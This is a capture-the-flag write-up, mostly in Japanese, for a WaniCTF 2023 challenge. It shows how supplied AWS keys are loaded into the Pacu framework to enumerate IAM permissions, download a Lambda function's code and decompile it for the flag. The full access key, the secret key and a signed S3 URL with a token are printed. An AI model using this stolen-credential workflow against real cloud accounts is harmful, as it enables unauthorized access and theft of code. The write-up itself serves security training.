# Lambda:Web:245pts
以下のサイトはユーザ名とパスワードが正しいときフラグを返します。今あなたはこのサイトの管理者のAWSアカウントのログイン情報を極秘に入手しました。このログインを突破できますか。  
The following site returns a flag when you input correct username and password. Now you have the confidential login information for the AWS account of the administrator of this site. Please get through this authentication.  
[https://lambda-web.wanictf.org](https://lambda-web.wanictf.org/)  

[web-lambda.zip](web-lambda.zip)  

# Solution
URLとファイルがもらえる。  
アクセスするとただのログインフォームのようだ。  
![site.png](site/site.png)  
配布ファイルを見ると以下の通りであった。  
```csv
Access key ID,Secret access key,Region
AKIA4HC66ZQSIGEXVKN7,HfrqqlelNVQD3g+i+PzhHc3HOTbh666y3c53ffN3,ap-northeast-1
```
AWSの各情報が書かれている。  
おそらくここから調査し、Lambdaの中身を抜いてこいとの問題に見える。  
ひとまずpacuで各情報を入れて調査する(一部省略)。  
```bash
$ pacu
Pacu (WaniCTF_2023_Lambda:No Keys Set) > set_keys
Key alias [None]: satokey
Access key ID [None]: AKIA4HC66ZQSIGEXVKN7
Secret access key [None]: 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
Pacu (WaniCTF_2023_Lambda:satokey) > set_regions ap-northeast-1
Pacu (WaniCTF_2023_Lambda:satokey) > run iam__privesc_scan
Pacu (WaniCTF_2023_Lambda:satokey) > whoami
{
  "UserName": "SecretUser",
  "RoleName": null,
  "Arn": "arn:aws:iam::839865256996:user/SecretUser",
  "AccountId": "839865256996",
  "UserId": "AIDA4HC66ZQSM6NQBYILY",
  "Roles": null,
  "Groups": [],
  "Policies": [
    {
      "PolicyName": "WaniLambdaGetFunc",
      "PolicyArn": "arn:aws:iam::839865256996:policy/WaniLambdaGetFunc"
    },
    {
      "PolicyName": "AWSCompromisedKeyQuarantineV2",
      "PolicyArn": "arn:aws:iam::aws:policy/AWSCompromisedKeyQuarantineV2"
    }
  ],
  "AccessKeyId": "AKIA4HC66ZQSIGEXVKN7",
  "SecretAccessKey": "HfrqqlelNVQD3g+i+Pzh********************",
  "SessionToken": null,
  "KeyAlias": "satokey",
  "PermissionsConfirmed": false,
  "Permissions": {
    "Allow": {
~~~
      "lambda:getfunction": {
        "Resources": [
          "arn:aws:lambda:ap-northeast-1:839865256996:function:wani_function"
        ]
~~~
```
`getfunction`が`Allow`なので`wani_function`を取得する。  
```bash
Pacu (WaniCTF_2023_Lambda:satokey) > aws lambda get-function --function-name wani_function
{
    "Configuration": {
        "FunctionName": "wani_function",
        "FunctionArn": "arn:aws:lambda:ap-northeast-1:839865256996:function:wani_function",
        "Runtime": "dotnet6",
        "Role": "arn:aws:iam::839865256996:role/service-role/wani_function-role-zhw0ck9t",
        "Handler": "WaniCTF_Lambda::WaniCTF_Lambda.Function::LoginWani",
        "CodeSize": 960588,
        "Description": "",
        "Timeout": 15,
        "MemorySize": 512,
        "LastModified": "2023-05-01T14:21:15.000+0000",
        "CodeSha256": "Gfkg4Q7OrMA+DPsFg6zR+gZXezeG8KEMe/8w8BLmRSA=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "0a4cde2c-6dbb-4240-9332-2f5611256deb",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        },
        "SnapStart": {
            "ApplyOn": "None",
            "OptimizationStatus": "Off"
        },
        "RuntimeVersionConfig": {
            "RuntimeVersionArn": "arn:aws:lambda:ap-northeast-1::runtime:45f8a281bf9e15e1f608cba66fecfeca659ebca96fcdfc615f54dcf70554a9e5"
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://awslambda-ap-ne-1-tasks.s3.ap-northeast-1.amazonaws.com/snapshots/839865256996/wani_function-df5e5803-a6c5-4483-b58a-a296b73218a3?versionId=JWFcoHVwceWBtheBA6f9sJoChpeeeHF.&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEPj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkcwRQIhALZ28Cxp7csnBcC7veReDujmXTaX8C%2Bo9CXpMa5qJV77AiBytKUccrTDQ05LbRaxWu7wGcqV15EwsmgqeSPpoLqZcCrABQgREAMaDDkxOTk4MDkyNTEzOSIMCQZo%2B2DbBSSES3DHKp0F0NxWXpTvLDBYoZfWITCUmmj0fLDMEHL1s3IEkgT%2BfiP9NqR4cWgacBYNpGJVguMZjY%2BvMvLSQU4IPjOGgJBS7sV2%2BbKufllR3bjE8N3XuWCXYBuQ%2BGRtxujAxEC9xwkaBELYZlwaLvKlA3voLUAVTwiCpTc%2BG52hhlvE46A8jliRol9Fxew8oqRhxmThZuHR5LKeN7RPmZ7jPW5v9NOEI2RlgT%2FdZhIQCp2hjpnJkHpqN59QFS3fg4vP2HZpn4rhjf8ozknGAo1MvHU9JG2WRzxyk8bHmc4vAk%2FDg7xAFPCSTRvrVHhUGqxespb48gIQ1dTko6y3o3yGBIWsxov96b7gF1QilI8i6l0KBZcfVAHT3SWJ32%2F2auXga58CK1Zhjhj%2BBfNCsLRUjm%2F3mrXVi2nqzEqBiMYhPZ9eDhmetNoz33%2FFn1Ock7VRDP7JfHrgKYsLf%2BCUAWnIhUET6CJuYyb8E1D8dOOAQIjTZQwD9ExxVJx%2BGiHJXYm6BNZEQ9W69ZnWV3EyU3AONhmT54ijy5YHhYAVKRveiJShU%2BcsKGzgb6aY%2BDFy3WfVaxKRSuKPOeDqPpV9sM1AXrwkN%2FTOs%2FkGFAS4ICkXMk2NqWdKsX0Vhkh0%2BvBxMtHZGuAKj0BlB0OtTYzUUsF5i9kzXc0YaeG0eIQCnHgjPCrLww0UmpnCrC%2BcNhprZJVmItp28mCfGpHODhwfXs0AWiCx6hV63pSeNubXJo6zCOKr%2BrwdJXnPvSz4RHT1RgZZWnvUCkRrKqOU2R6PeARKKikIElFL%2BdOOSntiSTtltZ30in8VVkIazSpUqjQH3fMjEBjdQtPmCy%2F8eDMb%2FGu6L698%2FcZlHzPE3wNbTquL9zNDAALahi2Jg5WU%2FPhnQ8aUHCfAMO%2F90qIGOrEBR0o61WVDsTxRDBH9OFqOS%2Fd3Zjd2xDSOP6z3QzEaGPm87OFivEaliLJnstABFtJ4dD6W6txkHIKVaF8%2Bydc6Qf5LVFChdtvPuw8dWOxH3aXUO6CwOrxvkmMc6vVhwu3TGjUA6AtoYE%2FLLpM7tuaeMb2e7hgU7AWpX6FI3DKgGT0oHmBKOKmjDcPt%2F0qBpfbn7Ms0xQkbsUty5gCDGSLtbHgK0MjuOAcAg35wLl8OBvih&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20230505T093229Z&X-Amz-SignedHeaders=host&X-Amz-Expires=599&X-Amz-Credential=ASIA5MMZC4DJR4L3JU4E%2F20230505%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Signature=8258e818f2f2a9dfc9dfe9c8de65141ae7a4c1031eca57c5504873a5dd3c5a82"
    }
}
```
取得できたのでzipを展開すると、以下の通り.NETであった。  
```bash
$ file *
Amazon.Lambda.APIGatewayEvents.dll:             PE32+ executable (DLL) (console) Mono/.Net assembly, for MS Windows
Amazon.Lambda.Core.dll:                         PE32+ executable (DLL) (console) Mono/.Net assembly, for MS Windows
Amazon.Lambda.Serialization.Json.dll:           PE32+ executable (DLL) (console) Mono/.Net assembly, for MS Windows
Amazon.Lambda.Serialization.SystemTextJson.dll: PE32+ executable (DLL) (console) Mono/.Net assembly, for MS Windows
Newtonsoft.Json.dll:                            PE32+ executable (DLL) (console) Mono/.Net assembly, for MS Windows
WaniCTF_Lambda.deps.json:                       JSON data
WaniCTF_Lambda.dll:                             PE32+ executable (DLL) (console) Mono/.Net assembly, for MS Windows
WaniCTF_Lambda.runtimeconfig.json:              JSON data
```
[ILSpy](https://github.com/icsharpcode/ILSpy)で読み込んでやる。  
![ILSpy.png](images/ILSpy.png)  
ユーザ名とパスワードとともにflagが表示された。  

## FLAG{l4mabd4_1s_s3rverl3ss_s3rv1c3}